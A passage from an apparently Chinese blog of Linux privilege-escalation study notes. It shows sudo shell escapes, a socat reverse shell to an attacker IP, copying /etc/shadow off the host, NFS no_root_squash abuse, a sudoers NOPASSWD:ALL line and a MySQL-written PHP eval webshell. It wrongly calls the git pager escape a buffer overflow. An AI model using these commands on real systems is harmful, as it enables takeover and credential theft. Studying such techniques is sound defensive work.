<p><strong><u>就可以发现<code>root</code>以<code>nopasswd</code>【不需要密码】运行git命令</u></strong></p>
<p>原理是git存在缓存区溢出漏洞，</p>
<p>在使用</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>不需要输入root密码，即可以root身份执行这条命令</p>
<p>操作如下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span>     </span><br><span class="line">//-<span class="selector-tag">p</span>是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</span><br></pre></td></tr></table></figure>

<p>下面可以看看区别</p>
<h5 id="注意"><a href="#注意" class="headerlink" title="*注意"></a>*注意</h5><h6 id="1-窗口足够大"><a href="#1-窗口足够大" class="headerlink" title="1.窗口足够大"></a>1.窗口足够大</h6><p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901113721300.png"><img src="/Linux-PowerUp/image-20220901113721300.png" alt="image-20220901113721300"></a></p>
<p>可以看到显示完了，就有回到原处了</p>
<h6 id="2-窗口小一些"><a href="#2-窗口小一些" class="headerlink" title="2.窗口小一些"></a>2.窗口小一些</h6><p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901113851826.png"><img src="/Linux-PowerUp/image-20220901113851826.png" alt="image-20220901113851826"></a></p>
<p>下方就显示出:，等待输入</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**:是自带有的，不是输入的</span><br><span class="line">:!/bin/sh    //感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git</span><br><span class="line">进入root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">当然也可以执行:!passwd root</span><br><span class="line">修改其密码</span><br><span class="line">然后su root登录也可</span><br></pre></td></tr></table></figure>

<h5 id="1-执行命令，拿到root的shell"><a href="#1-执行命令，拿到root的shell" class="headerlink" title="1.执行命令，拿到root的shell"></a>1.执行命令，拿到root的shell</h5><p><code>$</code>变成<code>#</code>成功</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901114902493.png"><img src="/Linux-PowerUp/image-20220901114902493.png" alt="image-20220901114902493"></a></p>
<h5 id="2-修改密码，登录"><a href="#2-修改密码，登录" class="headerlink" title="2.修改密码，登录"></a>2.修改密码，登录</h5><p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901114453769.png"><img src="/Linux-PowerUp/image-20220901114453769.png" alt="image-20220901114453769"></a></p>
<p><code>$</code>变成<code>#</code>，成功登录</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901114726423.png"><img src="/Linux-PowerUp/image-20220901114726423.png" alt="image-20220901114726423"></a></p>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a><strong>其他命令</strong></h4><p>也有很多其他命令可以用来提权，和之前的SUID提权中说的命令类似，例如sudo允许find命令，则可以通过exec参数来切换到root权限。</p>
<p>这里添加新用户aaa，并修改sudoers文件，允许部分命令，内容如下。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa  ALL=(ALL:ALL) <span class="regexp">/usr/</span>bin<span class="regexp">/find,/u</span>sr<span class="regexp">/bin/</span>perl,<span class="regexp">/usr/</span>bin<span class="regexp">/python3,/u</span>sr<span class="regexp">/bin/</span>less,<span class="regexp">/usr/</span>bin<span class="regexp">/awk,/u</span>sr<span class="regexp">/bin/m</span>an,<span class="regexp">/usr/</span>bin/vi</span><br></pre></td></tr></table></figure>

<p>这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224325691.png"><img src="/Linux-PowerUp/image-20220901224325691.png" alt="image-20220901224325691"></a></p>
<p>相关命令提权方式如下：</p>
<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote>
<p><code>exec</code>参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用<code>\</code>进行转义。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224342169.png"><img src="/Linux-PowerUp/image-20220901224342169.png" alt="image-20220901224342169"></a></p>
<h5 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h5><blockquote>
<p><code>e</code>参数用来指定要运行的命令，然后使用<code>linux</code>的<code>exec</code>参数来调用<code>bash</code>。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224356163.png"><img src="/Linux-PowerUp/image-20220901224356163.png" alt="image-20220901224356163"></a></p>
<h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><blockquote>
<p><code>c</code>参数可以在命令行执行<code>python</code>代码，<code>pty</code>库是一个伪终端库，它的<code>spawn</code>会调用指定的程序。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224409127.png"><img src="/Linux-PowerUp/image-20220901224409127.png" alt="image-20220901224409127"></a></p>
<h5 id="less"><a href="#less" class="headerlink" title="less"></a>less</h5><blockquote>
<p>输入<code>sudo less /etc/hosts</code>命令浏览文件内容时，到底部输入<code>!bash</code>后回车，会获得一个<code>root</code>权限的<code>shell</code>。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224420552.png"><img src="/Linux-PowerUp/image-20220901224420552.png" alt="image-20220901224420552"></a></p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224511943.png"><img src="/Linux-PowerUp/image-20220901224511943.png" alt="image-20220901224511943"></a></p>
<h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><blockquote>
<p>通过调用linux的system函数来打开bash。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224431624.png"><img src="/Linux-PowerUp/image-20220901224431624.png" alt="image-20220901224431624"></a></p>
<h5 id="man"><a href="#man" class="headerlink" title="man"></a>man</h5><blockquote>
<p>通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224541655.png"><img src="/Linux-PowerUp/image-20220901224541655.png" alt="image-20220901224541655"></a></p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224551402.png"><img src="/Linux-PowerUp/image-20220901224551402.png" alt="image-20220901224551402"></a></p>
<h5 id="vi"><a href="#vi" class="headerlink" title="*vi"></a>*vi</h5><blockquote>
<p><code>sudo vi</code>会进入vi默认页，输入<code>:!bash</code>回车，可进入<code>root</code>命令行。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224609706.png"><img src="/Linux-PowerUp/image-20220901224609706.png" alt="image-20220901224609706"></a></p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224622369.png"><img src="/Linux-PowerUp/image-20220901224622369.png" alt="image-20220901224622369"></a></p>
<h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><blockquote>
<p>如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。</p>
</blockquote>
<p>例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224639423.png"><img src="/Linux-PowerUp/image-20220901224639423.png" alt="image-20220901224639423"></a></p>
<p>参考代码：</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224909264.png"><img src="/Linux-PowerUp/image-20220901224909264.png" alt="image-20220901224909264"></a></p>
<h4 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a><strong>应用程序</strong></h4><blockquote>
<p>除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225004858.png"><img src="/Linux-PowerUp/image-20220901225004858.png" alt="image-20220901225004858"></a></p>
<h5 id="env"><a href="#env" class="headerlink" title="env"></a>env</h5><blockquote>
<p>通过env环境变量来获取root权限。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225022285.png"><img src="/Linux-PowerUp/image-20220901225022285.png" alt="image-20220901225022285"></a></p>
<h5 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h5><blockquote>
<p>通过ftp来进入bash获取root权限。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225031965.png"><img src="/Linux-PowerUp/image-20220901225031965.png" alt="image-20220901225031965"></a></p>
<h5 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h5><blockquote>
<p>通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo socat <span class="built_in">exec</span>:<span class="string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">攻击机执行：</span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225047468.png"><img src="/Linux-PowerUp/image-20220901225047468.png" alt="image-20220901225047468"></a></p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225056003.png"><img src="/Linux-PowerUp/image-20220901225056003.png" alt="image-20220901225056003"></a></p>
<h5 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h5><blockquote>
<p>还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感文件。例如etc&#x2F;passwd、etc&#x2F;shadow等。</p>
<p>如下命令，将passwd文件传输到指定机器的root&#x2F;Desktop下，然后再对密码进行破解等操作。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225110501.png"><img src="/Linux-PowerUp/image-20220901225110501.png" alt="image-20220901225110501"></a></p>
<h4 id="黑名单情况"><a href="#黑名单情况" class="headerlink" title="黑名单情况"></a><strong>黑名单情况</strong></h4><blockquote>
<p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225127772.png"><img src="/Linux-PowerUp/image-20220901225127772.png" alt="image-20220901225127772"></a></p>
<h2 id="3-NFS配置不当导致提权"><a href="#3-NFS配置不当导致提权" class="headerlink" title="3) NFS配置不当导致提权"></a>3) NFS配置不当导致提权</h2><h3 id="NFS介绍"><a href="#NFS介绍" class="headerlink" title="NFS介绍"></a>NFS介绍</h3><blockquote>
<p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。</p>
</blockquote>
<p>这里以ubuntu为例，简单配置一下：</p>
<p>首先安装nfs服务端：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install nfs-kernel-<span class="keyword">server</span></span><br></pre></td></tr></table></figure>

<p>安装后修改配置文件&#x2F;etc&#x2F;exports，这里将home目录进行挂载共享，内容如下：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>其中&#x2F;home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p>
<p>随后重启相关服务：</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nfs通过rpc通信，这里把rpcbind也重启下sudo <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="regexp">/rpcbind restartsudo /</span>etc<span class="regexp">/init.d/</span>nfs<span class="operator">-</span>kernel<span class="operator">-</span>server restart</span><br></pre></td></tr></table></figure>

<p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231323392.png"><img src="/Linux-PowerUp/image-20220901231323392.png" alt="image-20220901231323392"></a></p>
<p>或者通过nmap的相关脚本来进行扫描。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231334381.png"><img src="/Linux-PowerUp/image-20220901231334381.png" alt="image-20220901231334381"></a></p>
<h3 id="NFS配置不当可提权"><a href="#NFS配置不当可提权" class="headerlink" title="NFS配置不当可提权"></a><strong>NFS配置不当可提权</strong></h3><blockquote>
<p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。</p>
</blockquote>
<p>测试如下：</p>
<p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231351979.png"><img src="/Linux-PowerUp/image-20220901231351979.png" alt="image-20220901231351979"></a></p>
<p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
<p>普通用户执行即可获取root权限，这里注意需要加上<code>p</code>参数，否则权限还是当前用户的。</p>
<p><code>p</code>参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承<code>suid</code>，因为bash有<code>suid</code>权限，所以这里是root。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231410196.png"><img src="/Linux-PowerUp/image-20220901231410196.png" alt="image-20220901231410196"></a></p>
<p>使用场景：这个和<code>suid</code>提权很像，给程序赋予<code>suid</code>权限然后利用。不同的是前两篇<code>suid</code>提权是当前用户使用<code>sudo  chmod</code>自己修改的，在<code>sudoers</code>禁用<code>sudo</code>命令等情况下，就行不通了。而<code>nfs</code>配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
<p>同理，之前总结的<code>suid</code>提权的那些程序也同样适用，这里就不再记了。</p>
<h3 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a><strong>其它命令</strong></h3><p>除了可以直接得到<code>shell</code>的，还有其他一些程序不能直接获取，例如<code>nano、vi</code>等。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231423093.png"><img src="/Linux-PowerUp/image-20220901231423093.png" alt="image-20220901231423093"></a></p>
<p>然后使用<code>nano -p</code>来读取<code>shadow</code>文件，这里读取时把相关记录复制出来，使用<code>john</code>破解，测试不能重定向，需要权限，所以只能复制。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231435125.png"><img src="/Linux-PowerUp/image-20220901231435125.png" alt="image-20220901231435125"></a></p>
<p>复制后使用<code>john</code>破解获取相关用户密码，以<code>root</code>为例，密码是<code>root</code>。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231451129.png"><img src="/Linux-PowerUp/image-20220901231451129.png" alt="image-20220901231451129"></a></p>
<p>如果密码太复杂，破解不了，则可以尝试其它用户，例如我这里目标机是<code>aaa</code>用户，破解<code>aaa</code>密码为<code>aaa</code>。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231505353.png"><img src="/Linux-PowerUp/image-20220901231505353.png" alt="image-20220901231505353"></a></p>
<p>这时候不确定<code>aaa</code>是否为<code>root</code>权限，则可以继续使用<code>nano</code>去编辑<code>passwd</code>文件，给<code>aaa</code>赋权。</p>
<p>把原来的<code>1001</code>换成<code>0</code>.</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231516388.png"><img src="/Linux-PowerUp/image-20220901231516388.png" alt="image-20220901231516388"></a></p>
<p>然后切换<code>aaa</code>用户即可。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231524654.png"><img src="/Linux-PowerUp/image-20220901231524654.png" alt="image-20220901231524654"></a></p>
<p>利用这种机制，也可以用来修改<code>sudoers</code>文件，添加或修改为以下内容。</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa     <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>然后使用<code>sudo bash</code>或<code>sudo su</code>获取<code>root</code>权限。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231537204.png"><img src="/Linux-PowerUp/image-20220901231537204.png" alt="image-20220901231537204"></a></p>
<h2 id="4）Mysql提权"><a href="#4）Mysql提权" class="headerlink" title="4）Mysql提权"></a>4）Mysql提权</h2><h3 id="1、通过mysql日志功能"><a href="#1、通过mysql日志功能" class="headerlink" title="1、通过mysql日志功能"></a>1、通过mysql日志功能</h3><blockquote>
<p><code>SHOW VARIABLES LIKE &#39;general%&#39; 查询日志</code></p>
<p><code>set global general_log = &quot;ON&quot;; 开启日志记录</code></p>
<p><code>set global general_log_file=&#39;C://phpStudy//PHPTutorial//WWW//shell.php&#39;; 设置日志路径</code></p>
<p><code>select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;; 写入一句话</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="https://pic4.zhimg.com/80/v2-a4aea75eafabcf886d91113ba2822717_720w.webp"><img src="https://pic4.zhimg.com/80/v2-a4aea75eafabcf886d91113ba2822717_720w.webp" alt="img"></a></p>
<p><a data-fancybox="gallery" data-src="https://pic3.zhimg.com/80/v2-fa69f44df8bfd5f44a8d6a11dad9a55e_720w.webp"><img src="https://pic3.zhimg.com/80/v2-fa69f44df8bfd5f44a8d6a11dad9a55e_720w.webp" alt="img"></a></p>
<p>连接成功</p>
<h2 id="5）环境变量提权"><a href="#5）环境变量提权" class="headerlink" title="5）环境变量提权"></a>5）环境变量提权</h2><p><code>nepctf2023遇到</code></p>
<hr>
<h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><h3 id="linux常见的敏感文件"><a href="#linux常见的敏感文件" class="headerlink" title="linux常见的敏感文件"></a>linux常见的敏感文件</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>      <span class="comment">#当前运行进程</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/cmdline  <span class="comment">#当前进程命令行参数=</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/men     <span class="comment">#当前进程的内存内容</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/maps    <span class="comment">#当前进程的内存映射关系</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/environ <span class="comment">#包含当前进程的环境变量</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/fd  <span class="comment">#包含当前进程打开的文件的内容和路径</span></span><br><span class="line">/<span class="built_in">proc</span>/seflf/exe   <span class="comment">#获取当前进程</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/fd/    <span class="comment">#一个特殊的目录，它映射到了当前进程的文件描述符表。 【当文件删除了也可以在这里看到】</span></span><br><span class="line">           <span class="comment">#每个进程都有一个文件描述符表，其中包含了进程可以访问的文件和其他资源（如套接字、管道等）的描述符</span></span><br></pre></td></tr></table></figure>

<h4 id="内网探测文件"><a href="#内网探测文件" class="headerlink" title="内网探测文件"></a>内网探测文件</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">/etc/</span>hosts</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/arp</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/tcp</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/udp</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/dev</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/fib_trie</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
      
  <div class="popular-posts-header">相关文章</div>
  <ul class="popular-posts">
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\Reverses-shell\" rel="bookmark">反弹shell</a></div>
    </li>
  </ul>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/tooluse(bp-bruce)/" rel="prev" title="Burpsuite密码爆破">
      <i class="fa fa-chevron-left"></i> Burpsuite密码爆破
    </a></div>
      <div class="post-nav-item">
    <a href="/php-functions/" rel="next" title="PHP函数记录">
      PHP函数记录 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">Linux提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%EF%BC%89%E5%88%A9%E7%94%A8SUID%E6%8F%90%E6%9D%83"><span class="nav-number">1.1.</span> <span class="nav-text">1）利用SUID提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsuid%EF%BC%9F"><span class="nav-number">1.1.1.</span> <span class="nav-text">什么是suid？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSGID"><span class="nav-number">1.1.2.</span> <span class="nav-text">什么是SGID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID%E6%9D%83%E9%99%90"><span class="nav-number">1.1.3.</span> <span class="nav-text">SUID权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE"><span class="nav-number">1.1.4.</span> <span class="nav-text">*关键</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.1.5.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%88%A9%E7%94%A8find%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">（1）利用find获取root权限shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8cp%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="nav-number">1.1.5.2.</span> <span class="nav-text">（2）利用cp获取root权限shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%88%A9%E7%94%A8Vim%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="nav-number">1.1.5.3.</span> <span class="nav-text">（3）利用Vim获取root权限shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E5%88%A9%E7%94%A8nmap%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="nav-number">1.1.5.4.</span> <span class="nav-text">（4）利用nmap获取root权限shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E6%97%A7%E7%89%88"><span class="nav-number">1.1.5.4.1.</span> <span class="nav-text">1.旧版</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%96%B0%E7%89%88"><span class="nav-number">1.1.5.4.2.</span> <span class="nav-text">2.新版</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90shell"><span class="nav-number">1.1.5.5.</span> <span class="nav-text">（5）利用脚本获取root权限shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%EF%BC%89%E5%88%A9%E7%94%A8SUDO%E6%8F%90%E6%9D%83"><span class="nav-number">1.2.</span> <span class="nav-text">2）利用SUDO提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo%E5%92%8Csu%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">1.2.1.</span> <span class="nav-text">sudo和su的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudoers%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.2.</span> <span class="nav-text">sudoers文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-su-sudo-bash"><span class="nav-number">1.2.3.</span> <span class="nav-text">sudo su &amp;&amp; sudo bash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SUDO-dd-%E6%8F%90%E6%9D%83%E6%B3%95"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">*SUDO -dd 提权法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GIT"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">*GIT</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F"><span class="nav-number">1.2.3.2.1.</span> <span class="nav-text">*注意</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-%E7%AA%97%E5%8F%A3%E8%B6%B3%E5%A4%9F%E5%A4%A7"><span class="nav-number">1.2.3.2.1.1.</span> <span class="nav-text">1.窗口足够大</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-%E7%AA%97%E5%8F%A3%E5%B0%8F%E4%B8%80%E4%BA%9B"><span class="nav-number">1.2.3.2.1.2.</span> <span class="nav-text">2.窗口小一些</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%8B%BF%E5%88%B0root%E7%9A%84shell"><span class="nav-number">1.2.3.2.2.</span> <span class="nav-text">1.执行命令，拿到root的shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%8C%E7%99%BB%E5%BD%95"><span class="nav-number">1.2.3.2.3.</span> <span class="nav-text">2.修改密码，登录</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">其他命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#find"><span class="nav-number">1.2.3.3.1.</span> <span class="nav-text">find</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#perl"><span class="nav-number">1.2.3.3.2.</span> <span class="nav-text">perl</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#python"><span class="nav-number">1.2.3.3.3.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#less"><span class="nav-number">1.2.3.3.4.</span> <span class="nav-text">less</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#awk"><span class="nav-number">1.2.3.3.5.</span> <span class="nav-text">awk</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#man"><span class="nav-number">1.2.3.3.6.</span> <span 